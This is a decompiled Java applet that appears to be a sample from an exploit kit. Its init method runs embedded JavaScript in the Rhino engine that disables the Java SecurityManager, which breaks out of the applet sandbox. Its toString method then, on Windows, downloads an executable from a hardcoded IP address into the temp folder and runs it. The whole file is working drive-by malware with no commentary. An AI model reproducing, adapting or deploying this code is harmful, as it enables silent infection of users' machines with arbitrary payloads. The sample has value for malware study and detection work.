import java.awt.Component;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.script.Invocable;
import javax.swing.JList;
import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Final extends Applet
{
    private ScriptEngine createEngine() {
        return new ScriptEngineManager().getEngineByName("JavaScript");
    }
    
    @Override
    public void init() {
        this.www();
    }
    
    private JList createJList(final Object o) {
        return new JList((E[])new Object[] { o });
    }
    
    private void engineEval(final ScriptEngine scriptEngine, final String s) {
        try {
            scriptEngine.eval(s);
        }
        catch (Exception ex) {}
    }
    
    private void www() {
        try {
            final String s = "    function toString(o){i = 0; this.toString = function(){ if( i==0) try{java.lang.System.setSecurityManager(null); o.toString() ; } catch( e){}i = 1; return ''; };e = new Error(); e.message = this; return e;}";
            final ScriptEngine engine = this.createEngine();
            this.engineEval(engine, s);
            this.doAdd(this.createJList(((Invocable)engine).invokeFunction("toString", this)));
        }
        catch (Exception ex) {}
    }
    
    private void downloadAndStart(final String s) {
        final String string = System.getProperty("java.io.tmpdir") + "\\" + ("" + Math.random() * 1000.0).substring(0, 8) + ".exe";
        try {
            final InputStream is = Sec.createIS(s);
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            int n = 0;
            int read;
            while ((read = is.read()) != -1) {
                fileOutputStream.write(read);
                ++n;
            }
            is.close();
            fileOutputStream.close();
            Sec.exe(string);
        }
        catch (Exception ex) {
            try {
                Sec.exe("\"" + string + "\"");
            }
            catch (Exception ex2) {}
        }
    }
    
    @Override
    public String toString() {
        try {
            final String s = "92.241.191.180";
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                this.downloadAndStart("http://" + s + "/load.php?showforum=rhino");
            }
        }
        catch (Exception ex) {}
        return "";
    }
    
    private void doAdd(final JList list) {
        this.add(list);
    }
}
